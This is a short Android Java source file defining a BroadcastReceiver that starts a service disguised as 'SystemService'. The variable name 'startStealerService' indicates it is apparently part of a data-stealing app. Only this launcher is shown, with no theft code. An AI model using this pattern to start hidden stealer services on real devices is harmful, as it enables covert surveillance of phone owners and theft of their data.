package com.sudy.watchdog;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.widget.Toast;

/**
 * Created by sudy49730 on 07/04/2018.
 */

public class MyReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Intent startStealerService=new Intent(context,SystemService.class);
        context.startService(startStealerService);
    }
}
